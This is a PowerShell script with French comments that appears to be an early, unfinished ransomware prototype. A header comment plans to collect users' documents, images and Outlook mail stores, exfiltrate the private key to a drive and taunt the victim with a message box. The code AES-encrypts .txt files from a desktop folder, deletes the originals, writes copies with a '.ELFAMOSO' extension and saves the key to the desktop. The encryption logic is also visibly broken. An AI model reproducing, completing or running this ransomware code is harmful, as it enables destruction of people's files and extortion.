<#
Récupérer tout les fichier txt, docx, jpg, ps1, png, xlsx, xls, doc, csv, pdf, pst, ost, (libre office)
créer une clé asymétrique
envoyer la clé privé dans un drive
afficher une messagebox qui dit que vous êtes niqué

#>

# Fichier
$FilePath = Get-ChildItem "C:\Users\caca\Desktop\Pl1DeFichier\*.txt"
$FileTab = "test"

# Préparer clé et du vecteur d'initialisation(???)
$RandCrypt = New-Object System.Security.Cryptography.RNGCryptoServiceProvider 
    #Création d'un objet "Clé" en 32 Octets
    $Key = New-Object Byte[] 32
        $RandCrypt.GetBytes($Key)
    #Création d'un object "VI" en 16 Octets
    $VI = New-Object Byte[] 16
        $RandCrypt.GetBytes($VI)

<# Créer les objets en AES grâce à la clé et a la VI
sources
    https://gist.github.com/ctigeek/2a56648b923d198a6e60
#>
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $Key
$AES.iv = $VI
Write-Host "
#---------------------------------------------------------------------------------------------------------------------#
#                                             Clé AES :                                                               #
# $Key #
#---------------------------------------------------------------------------------------------------------------------#"

Write-Host "
#---------------------------------------------------------------------------------------------------------------------#
#                                            valeur D'initiation:                                                     #
#                              $VI                                 #
#---------------------------------------------------------------------------------------------------------------------#
"
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$Encryptor = $AES.CreateEncryptor()

# foreach file in c: d: ....
# TODO improve memory managment 
$bytes = Get-Content $FilePath -Encoding byte

#Supprimer les fichier bon
foreach ($fr in $FilePath) {
    Remove-Item "$fr"
}

#Création de
$encryptedData = $Encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[byte[]] $fullData = $AES.IV + $encryptedData

#Backup la VI et chiffre les fichiers en .ELFAMOSO
foreach ($fs in $FilePath) {
    Set-Content -Value $fullData -LiteralPath "$fs.ELFAMOSO" -Encoding byte
}
# Supprimer les Bytes enregistré dans la mémoire
$bytes = $Null


# Sauvegarder la clé sur le bureau
$userDesk = [Environment]::GetFolderPath("Desktop")
Set-Content -Value $Key -LiteralPath "$userDesk/LaKey.key" -Encoding byte
